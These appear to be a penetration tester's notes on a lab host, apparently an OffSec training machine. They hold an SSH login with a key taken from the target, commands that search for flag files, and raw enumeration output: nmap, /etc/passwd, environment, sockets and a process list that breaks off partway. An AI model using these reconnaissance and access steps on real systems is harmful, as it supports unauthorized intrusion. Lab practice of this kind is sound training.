# 192.168.X.245
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`

- /home/anita/local.txt
- /root/proof.txt
# Accounts
### anita / - (fireball)
`ssh -i challenge/2/192.168.X/245/anita_key_no_pass anita@192.168.240.245 -p 2222` 
`id`
```
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
```
`env`
```
USER=anita
SSH_CLIENT=192.168.45.214 48278 2222
XDG_SESSION_TYPE=tty
HOME=/home/anita
MOTD_SHOWN=pam
OLDPWD=/home
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
LOGNAME=anita
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1004
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/anita
SSH_CONNECTION=192.168.45.214 48278 192.168.240.245 2222
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop

```

# Enumeration
## NMAP
`sudo nmap -sV 192.168.152.245 --top-ports 1000`
```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`sudo nmap -sV -p 443 --script "vuln" 192.168.152.245`
```
```
`sudo nmap -A -T4 -p- 192.168.152.245`
```

```
## Local Users
`/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```
hostname
web01
cat /etc/issue
Ubuntu 20.04.5 LTS \n \l
uname -a
Linux web01 5.4.0-128-generic #144-Ubuntu SMP Tue Sep 20 11:00:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```
## Routes
`routel`
```
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default    192.168.240.254                   static          ens192 
 192.168.240.0/ 24                 192.168.240.245   kernel     link ens192 
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
     127.0.0.0/ 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
  192.168.240.0          broadcast 192.168.240.245   kernel     link ens192 local
192.168.240.245              local 192.168.240.245   kernel     host ens192 local
192.168.240.255          broadcast 192.168.240.245   kernel     link ens192 local
            ::1                                      kernel              lo 
            ::1              local                   kernel              lo local

```
## Netstat
`ss -anp`
```
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                      Peer Address:Port       Process                                                                                                                                          
nl         UNCONN      0           0                                                         0:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                         0:1                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                         0:676                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                         0:676                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                         0:1                                     *                                                                                                                                                            
nl         UNCONN      768         0                                                         4:0                                     *                                                                                                                                                            
nl         UNCONN      4352        0                                                         4:5436                                  *                                                                                                                                                            
nl         UNCONN      0           0                                                         7:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                         9:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                         9:1                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                         9:-1927022993                           *                                                                                                                                                            
nl         UNCONN      0           0                                                         9:1                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        10:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        11:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:674                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-1764413919                           *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:703                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:758                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:1                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:4870                                  *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:554                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:706                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-982840049                            *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-1136025605                           *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:708                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:411                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-422473834                            *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:0                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:4870                                  *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:703                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:758                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-422473834                            *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-1136025605                           *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-982840049                            *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:706                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:708                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:674                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:554                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:-1764413919                           *                                                                                                                                                            
nl         UNCONN      0           0                                                        15:1                                     *                                                                                                                                                            
nl         UNCONN      0           0                                                        16:674                                   *                                                                                                                                                            
nl         UNCONN      0           0                                                        18:0                                     *                                                                                                                                                            
p_raw      UNCONN      0           0                                                   [35020]:ens192                                *                                                                                                                                                            
u_seq      LISTEN      0           4096                                      /run/udev/control 16024                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                   /var/snap/lxd/common/lxd/unix.socket 21572                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                             /run/user/1004/systemd/notify 43029                                * 0           users:(("systemd",pid=4870,fd=16))                                                                                                              
u_str      LISTEN      0           4096                         /run/user/1004/systemd/private 43032                                * 0           users:(("systemd",pid=4870,fd=19))                                                                                                              
u_str      LISTEN      0           4096                                     /run/user/1004/bus 43039                                * 0           users:(("systemd",pid=4870,fd=12))                                                                                                              
u_str      LISTEN      0           4096                         /run/user/1004/gnupg/S.dirmngr 43040                                * 0           users:(("systemd",pid=4870,fd=26))                                                                                                              
u_str      LISTEN      0           4096               /run/user/1004/gnupg/S.gpg-agent.browser 43041                                * 0           users:(("systemd",pid=4870,fd=27))                                                                                                              
u_str      LISTEN      0           4096                 /run/user/1004/gnupg/S.gpg-agent.extra 43042                                * 0           users:(("systemd",pid=4870,fd=28))                                                                                                              
u_str      LISTEN      0           4096                  @/org/kernel/linux/storage/multipathd 16008                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                   /run/user/1004/gnupg/S.gpg-agent.ssh 43043                                * 0           users:(("systemd",pid=4870,fd=29))                                                                                                              
u_str      LISTEN      0           4096                       /run/user/1004/gnupg/S.gpg-agent 43044                                * 0           users:(("systemd",pid=4870,fd=30))                                                                                                              
u_str      LISTEN      0           4096                       /run/user/1004/pk-debconf-socket 43046                                * 0           users:(("systemd",pid=4870,fd=31))                                                                                                              
u_str      LISTEN      0           4096              /run/user/1004/snapd-session-agent.socket 43048                                * 0           users:(("systemd",pid=4870,fd=32))                                                                                                              
u_dgr      UNCONN      0           0                                       /run/systemd/notify 15992                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                                   /run/systemd/private 15995                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096             /run/systemd/userdb/io.systemd.DynamicUser 15997                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                               /run/lvm/lvmpolld.socket 16006                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                               /run/systemd/journal/syslog 16009                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                              /run/systemd/journal/dev-log 16017                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                            /run/systemd/journal/stdout 16019                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                               /run/systemd/journal/socket 16021                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                /run/systemd/journal/io.systemd.journal 17122                                * 0                                                                                                                                                           
u_str      LISTEN      0           32                         /var/run/vmware/guestServicePipe 21042                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                            /run/dbus/system_bus_socket 21556                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                                      /run/snapd.socket 21578                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                                 /run/snapd-snap.socket 21580                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                                     /run/uuidd/request 21582                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096                           @ISCSIADM_ABSTRACT_NAMESPACE 21571                                * 0                                                                                                                                                           
u_str      LISTEN      0           4096              /var/snap/lxd/common/lxd-user/unix.socket 21576                                * 0                                                                                                                                                           
u_str      ESTAB       0           0                                                         * 22837                                * 23237                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 15993                                * 15994                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 24515                                * 24514                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 22606                                * 23235                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 23836                                * 23605                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 24513                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 19141                                * 19140                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 42964                                * 42966       users:(("systemd",pid=4870,fd=2),("systemd",pid=4870,fd=1))                                                                                     
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 22094                                * 22092                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 42966                                * 42964                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 24514                                * 24515                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 19140                                * 19141                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 15994                                * 15993                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 23605                                * 23836                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 20490                                * 20491                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 25181                                * 25182                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24522                                * 24288                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24516                                * 21570                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 43397                                * 43396                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 19980                                * 19978                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 20492                                * 20493                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 20465                                * 16021                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 25182                                * 25181                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 24254                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                                                         * 20491                                * 20490                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 25186                                * 25185                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 23242                                * 23224                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 20493                                * 20492                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 25185                                * 25186                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 43396                                * 43397                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21570                                * 24516                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 24288                                * 24522                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 23235                                * 22606                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24521                                * 23848                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 23237                                * 22837                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 21947                                * 21940                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 25611                                * 25612                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 24253                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 23848                                * 24521                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 25612                                * 25611                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 17125                                * 15992                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21177                                * 21178                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 22092                                * 22094                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21178                                * 21177                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 21169                                * 21167                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 22019                                * 24519                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24517                                * 21573                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21170                                * 16021                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 22021                                * 22023                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21573                                * 24517                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21940                                * 21947                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21175                                * 21176                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24519                                * 22019                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21176                                * 21175                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 23224                                * 23242                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 22990                                * 23238                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 21355                                * 16021                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 17678                                * 17447                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 23238                                * 22990                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 21331                                * 21329                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 20294                                * 20293                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 17458                                * 17459                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 25065                                * 25064                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 17447                                * 17678                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 25064                                * 25065                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 17459                                * 17458                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 25053                                * 16021                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21574                                * 24518                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 20739                                * 0                                                                                                                                                           
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24518                                * 21574                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 17456                                * 16021                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 17575                                * 16021                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 24894                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24520                                * 23847                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 20413                                * 20414                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 23847                                * 24520                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 20293                                * 20294                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 24748                                * 24746                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 19978                                * 19980                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21329                                * 21331                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 22098                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 24911                                * 24910                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 22023                                * 22021                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 21167                                * 21169                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 24910                                * 24911                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 20414                                * 20413                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 42999                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                               /run/systemd/journal/stdout 24615                                * 24614                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 27552                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 43033                                * 43034       users:(("systemd",pid=4870,fd=20))                                                                                                              
u_dgr      UNCONN      0           0                                                         * 43031                                * 43030       users:(("systemd",pid=4870,fd=18))                                                                                                              
u_dgr      UNCONN      0           0                                                         * 43030                                * 43031       users:(("systemd",pid=4870,fd=17))                                                                                                              
u_str      ESTAB       0           0                                                         * 42723                                * 0                                                                                                                                                           
u_dgr      UNCONN      0           0                                                         * 42749                                * 16017                                                                                                                                                       
u_str      ESTAB       0           0                               /run/dbus/system_bus_socket 43034                                * 43033                                                                                                                                                       
u_dgr      UNCONN      0           0                                                         * 43021                                * 16021       users:(("systemd",pid=4870,fd=3))                                                                                                               
u_str      ESTAB       0           0                                                         * 24746                                * 24748                                                                                                                                                       
u_str      ESTAB       0           0                                                         * 24614                                * 24615                                                                                                                                                       
udp        UNCONN      0           0                                             127.0.0.53%lo:53                             0.0.0.0:*                                                                                                                                                           
tcp        LISTEN      0           128                                                 0.0.0.0:2222                           0.0.0.0:*                                                                                                                                                           
tcp        LISTEN      0           32                                                  0.0.0.0:21                             0.0.0.0:*                                                                                                                                                           
tcp        LISTEN      0           4096                                          127.0.0.53%lo:53                             0.0.0.0:*                                                                                                                                                           
tcp        ESTAB       0           36                                          192.168.240.245:2222                    192.168.45.214:48278                                                                                                                                                       
tcp        LISTEN      0           128                                                    [::]:2222                              [::]:*                                                                                                                                                           
tcp        LISTEN      0           511                                                       *:80                                   *:*                                                                                                                                                           
tcp        LISTEN      0           511                                                       *:443                                  *:*                                                                                                                                                           
tcp        LISTEN      0           511                                                       *:8000                                 *:*                                                                                                                                                           
v_str      ESTAB       0           0                                                2403054543:1023                                 0:976  
```
`ps aux`
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.6 103868 12812 ?        Ss   15:45   0:01 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    15:45   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   15:45   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   15:45   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   15:45   0:00 [kworker/0:0H-events_highpri]
root           8  0.0  0.0      0     0 ?        I<   15:45   0:00 [kworker/0:1H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   15:45   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    15:45   0:00 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    15:45   0:00 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    15:45   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    15:45   0:00 [idle_inject/0]
root          15  0.0  0.0      0     0 ?        S    15:45   0:00 [cpuhp/0]
root          16  0.0  0.0      0     0 ?        S    15:45   0:00 [kdevtmpfs]
root          17  0.0  0.0      0     0 ?        I<   15:45   0:00 [netns]
root          18  0.0  0.0      0     0 ?        S    15:45   0:00 [rcu_tasks_kthre]
root          19  0.0  0.0      0     0 ?        S    15:45   0:00 [kauditd]
root          20  0.0  0.0      0     0 ?        S    15:45   0:00 [khungtaskd]
root          21  0.0  0.0      0     0 ?        S    15:45   0:00 [oom_reaper]
root          22  0.0  0.0      0     0 ?        I<   15:45   0:00 [writeback]
root          23  0.0  0.0      0     0 ?        S    15:45   0:00 [kcompactd0]
root          24  0.0  0.0      0     0 ?        SN   15:45   0:00 [ksmd]
root          25  0.0  0.0      0     0 ?        SN   15:45   0:00 [khugepaged]
root          71  0.0  0.0      0     0 ?        I<   15:45   0:00 [kintegrityd]
root          72  0.0  0.0      0     0 ?        I<   15:45   0:00 [kblockd]
root          73  0.0  0.0      0     0 ?        I<   15:45   0:00 [blkcg_punt_bio]
root          74  0.0  0.0      0     0 ?        I<   15:45   0:00 [tpm_dev_wq]
root          75  0.0  0.0      0     0 ?        I<   15:45   0:00 [ata_sff]
root          76  0.0  0.0      0     0 ?        I<   15:45   0:00 [md]
root          77  0.0  0.0      0     0 ?        I<   15:45   0:00 [edac-poller]
root          78  0.0  0.0      0     0 ?        I<   15:45   0:00 [devfreq_wq]
root          79  0.0  0.0      0     0 ?        S    15:45   0:00 [watchdogd]
root          82  0.0  0.0      0     0 ?        S    15:45   0:00 [kswapd0]
root          83  0.0  0.0      0     0 ?        S    15:45   0:00 [ecryptfs-kthrea]
root          85  0.0  0.0      0     0 ?        I<   15:45   0:00 [kthrotld]
root          86  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/24-pciehp]
root          87  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/25-pciehp]
root          88  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/26-pciehp]
root          89  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/27-pciehp]
root          90  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/28-pciehp]
root          91  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/29-pciehp]
root          92  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/30-pciehp]
root          93  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/31-pciehp]
root          94  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/32-pciehp]
root          95  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/33-pciehp]
root          96  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/34-pciehp]
root          97  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/35-pciehp]
root          98  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/36-pciehp]
root          99  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/37-pciehp]
root         100  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/38-pciehp]
root         101  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/39-pciehp]
root         102  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/40-pciehp]
root         103  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/41-pciehp]
root         104  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/42-pciehp]
root         105  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/43-pciehp]
root         106  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/44-pciehp]
root         107  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/45-pciehp]
root         108  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/46-pciehp]
root         109  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/47-pciehp]
root         110  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/48-pciehp]
root         111  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/49-pciehp]
root         112  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/50-pciehp]
root         113  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/51-pciehp]
root         114  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/52-pciehp]
root         115  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/53-pciehp]
root         116  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/54-pciehp]
root         117  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/55-pciehp]
root         118  0.0  0.0      0     0 ?        I<   15:45   0:00 [acpi_thermal_pm]
root         119  0.0  0.0      0     0 ?        S    15:45   0:00 [scsi_eh_0]
root         120  0.0  0.0      0     0 ?        I<   15:45   0:00 [scsi_tmf_0]
root         121  0.0  0.0      0     0 ?        S    15:45   0:00 [scsi_eh_1]
root         122  0.0  0.0      0     0 ?        I<   15:45   0:00 [scsi_tmf_1]
root         124  0.0  0.0      0     0 ?        I<   15:45   0:00 [vfio-irqfd-clea]
root         125  0.0  0.0      0     0 ?        I<   15:45   0:00 [ipv6_addrconf]
root         135  0.0  0.0      0     0 ?        I<   15:45   0:00 [kstrp]
root         138  0.0  0.0      0     0 ?        I<   15:45   0:00 [kworker/u3:0]
root         151  0.0  0.0      0     0 ?        I<   15:45   0:00 [charger_manager]
root         192  0.0  0.0      0     0 ?        S    15:45   0:00 [scsi_eh_2]
root         193  0.0  0.0      0     0 ?        I<   15:45   0:00 [scsi_tmf_2]
root         194  0.0  0.0      0     0 ?        I<   15:45   0:00 [vmw_pvscsi_wq_2]
root         196  0.0  0.0      0     0 ?        I<   15:45   0:00 [cryptd]
root         225  0.0  0.0      0     0 ?        S    15:45   0:00 [irq/16-vmwgfx]
root         228  0.0  0.0      0     0 ?        I<   15:45   0:00 [ttm_swap]
root         262  0.0  0.0      0     0 ?        I<   15:45   0:00 [raid5wq]
root         305  0.0  0.0      0     0 ?        S    15:45   0:00 [jbd2/sda2-8]
root         306  0.0  0.0      0     0 ?        I<   15:45   0:00 [ext4-rsv-conver]
root         376  0.0  0.9  68528 20300 ?        S<s  15:45   0:00 /lib/systemd/systemd-journald
root         403  0.0  0.0      0     0 ?        I<   15:45   0:00 [ipmi-msghandler]
root         411  0.0  0.3  22696  6184 ?        Ss   15:45   0:00 /lib/systemd/systemd-udevd
root         550  0.0  0.0      0     0 ?        I<   15:45   0:00 [kaluad]
root         551  0.0  0.0      0     0 ?        I<   15:45   0:00 [kmpath_rdacd]
root         552  0.0  0.0      0     0 ?        I<   15:45   0:00 [kmpathd]
root         553  0.0  0.0      0     0 ?        I<   15:45   0:00 [kmpath_handlerd]
root         554  0.0  0.8 345772 18000 ?        SLsl 15:45   0:01 /sbin/multipathd -d -s
root         563  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop0]
root         568  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop1]
root         569  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop2]
root         570  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop3]
